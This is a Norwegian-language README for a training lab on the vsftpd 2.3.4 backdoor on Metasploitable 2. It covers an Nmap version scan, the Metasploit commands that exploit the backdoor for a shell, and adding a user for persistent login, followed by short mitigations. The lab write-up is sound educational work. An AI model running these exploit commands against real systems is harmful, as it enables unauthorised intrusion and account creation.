# vsftpd 2.3.4 backdoor — lab

Fiktiv, kontrollert øvingslab: identifisere sårbar **vsftpd 2.3.4**, utnytte med Metasploit og verifisere shell.  
> **Ansvarsfraskrivelse:** Kun i lab/demo. Ikke forsøk mot systemer du ikke eier eller har eksplisitt tillatelse til.

## Mål
- Finne FTP-versjon (Nmap)
- Utnytte backdoor (Metasploit)
- Opprette ny bruker og verifisere innlogging

## Miljø (kort)
- Angriper: Kali Linux  
- Mål: Metasploitable 2 (lokalt labnett)  
- Verktøy: Nmap, Metasploit

## Evidens (sett inn skjermbilder senere)
**1) Versjonsidentifikasjon**
![Nmap FTP-versjon](images/nmap-ftp-version.png "Nmap viser vsftpd 2.3.4")

**2) Utnyttelse og shell**
![Metasploit shell](images/msf-session.png "Shell etablert via exploit/unix/ftp/vsftpd_234_backdoor")

**3) Opprette bruker**
![adduser](images/adduser.png "Opprett lab-bruker (maskér kandidatnummer ved behov)")

**4) Innlogging etter restart**
![innlogging](images/login-new-user.png "Innlogging med ny bruker")

## Reproduser (eksempelkommandoer)
```bash
# 1) Oppdagelse
nmap -sV -p 21 192.168.x.x

# 2) Metasploit (kort)
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.x.x
run
```

## Mitigasjoner (kort)
- Fjern/oppgrader sårbar tjeneste
- Reduser angrepsflate (steng ubrukte porter)
- Patchrutiner, IDS/IPS-signaturer

## Vedlegg (ekstra)

**Metasploit – banner**
![msfconsole banner](images/msfconsole-banner.png)

**Metasploit – modulsøk etter vsftpd**
![msf search vsftpd](images/msf-search-vsftpd.png)

**Nmap – full scan**
![Nmap full](images/nmap-ftp-version-large.png)


## Lisens
MIT
